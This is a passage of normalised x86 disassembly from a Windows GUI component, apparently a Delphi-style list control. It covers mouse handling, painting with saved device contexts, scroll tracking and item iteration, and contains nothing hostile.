or esi 0x2
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_437da4
mov [ ebp - 0x8 ] eax
sub_43b5c0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_45071c
lea ecx [ esp + 0x8 ]
or edx 0xffffffff
call sub_429ee0
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x22c ]
call sub_437da4
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_43b628
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_405fd0
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_45071c
mov edx esp
call sub_429f2c
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437da4
mov esi eax
sub_43b68c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45071c
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_429f58
pop esi
pop ebx
retn
sub_43b6ac
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43b6ec
inc edi
dec esi
jne r-xdata
sub_43b6ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437044
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_404410
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_418f90
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_403350
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437044
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45071c
lea ecx [ esp + 0x5 ]
pop edx
call sub_429f84
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437044
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45071c
lea ecx [ esp + 0x5 ]
pop edx
call sub_429f84
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_45071c
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_429fe0
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437044
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45071c
mov ecx [ edi + 0x24 ]
pop edx
call sub_429fe0
sub_43b83c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ax [ edi + 0x4 ]
call sub_46099c
mov ebx eax
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x26c ] 0xffffffff
mov edx edi
mov eax esi
call sub_44b4a4
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
cmp [ esi + 0x228 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_449964
lea eax [ esp + 0xc ]
call sub_406b44
mov [ esp + 0x8 ] eax
mov eax esi
call sub_44a590
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x228 ] 0x0
je r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406ab8
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageA
jmp r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406ab8
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44afd4
mov [ esi + 0x230 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43b628
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_437898
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43b628
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44a4c8
mov edx 0x3
mov eax ebp
call sub_437898
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44a4c8
jmp r-xdata
sub_43b9a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_43bb24
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_449824
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4192f0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bb2b
mov eax [ ebp - 0x14 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43bb07
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_436e6c
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418454
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4185b0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx ebx
call sub_437044
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4185b0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_436ea0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_436e6c
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4184a0
mov eax esi
call sub_436e6c
sub [ ebp - 0xc ] eax
sub_43bb34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ebf8
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_43b9a0
sub_43bb68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424c0c
xor eax eax
push ebp
push sub_43bc81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425038
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ed8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424ef4
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437da4
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424b98
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bc88
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425038
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_424eb0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_43bca0
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
setne al
jmp r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
retn
cmp [ eax + 0x2f2 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_43bda8
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2aa ] 0x0
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2ac ]
call [ esi + 0x2a8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
sub_43be00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2b2 ] 0x0
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2b4 ]
call [ esi + 0x2b0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
sub_43be70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2ba ] 0x0
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2bc ]
call [ esi + 0x2b8 ]
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
sub_43bee8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_448a14
cmp [ ebx + 0x332 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x210 ]
call sub_424b98
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x210 ]
call sub_424d48
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43bf60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x352 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x354 ]
call [ ebx + 0x350 ]
sub_43bfa4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43c0fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x210 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424910
mov eax [ ebx + 0x290 ]
call sub_4192f0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c102
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f74
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_4245f0
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_4372e0
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_424028
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_4372e0
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_424d48
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_4372e0
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_424514
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_4245f0
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b24c
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43b24c
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_4372e0
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405fd8
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_424c98
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_4372e0
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_43c10c
push ebx
mov ebx eax
mov eax ebx
call sub_44e8ac
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_43bfa4
sub_43c140
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c259
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x35a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c16c
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_43b628
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c260
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_403fe8
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10c ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_437c08
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_449938
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_449938
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x8 ]
call sub_403fa4
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_449824
mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43c288
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c2ac
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45071c
mov edx esi
call sub_42a20c
sub_43c2c0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov al [ ebx + 0x244 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_43c2f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b628
test eax eax
jne r-xdata
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b748
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43c33c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x23c ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x23c ]
mov edx esi
call sub_437044
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_43c378
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_416f88
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4517d8
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_43b44c
test eax eax
je r-xdata
mov eax ebx
call sub_43b44c
lea ecx [ esp + 0x10 ]
mov dl 0x3
call sub_437c08
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
call sub_40600c
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_449938
mov eax esp
call sub_406b44
mov [ esi + 0x8 ] eax
sub_43c3f0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_437d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_437da4
xor ecx ecx
mov edx 0x3
call sub_437900
inc esi
dec ebx
jne r-xdata
sub_43c42c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x22c ]
call sub_437d74
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437da4
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437da4
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xd4 ]
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_437da4
mov edx 0x3
call sub_437898
test al al
je r-xdata
sub_43c4a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437e88
xor eax eax
push ebp
push sub_43c539
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437d74
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438064
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437da4
mov edx 0x3
call sub_437898
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437da4
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403350
sub_43c554
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_437d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_437da4
mov cl 0x1
mov edx 0x3
call sub_437900
inc esi
dec ebx
jne r-xdata
sub_43c590
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437e88
xor eax eax
push ebp
push sub_43c5dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437e68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c5e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438064
retn
sub_43c5f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4511a8
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43b30c
cmp [ edi + 0x21c ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43c654
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44eac0
push 0x1
mov eax ebx
call sub_45071c
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_44eac0
push 0x1
mov eax ebx
call sub_45071c
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_45071c
push eax
call InvalidateRect
jmp r-xdata
sub_43c6b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_42fb68
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
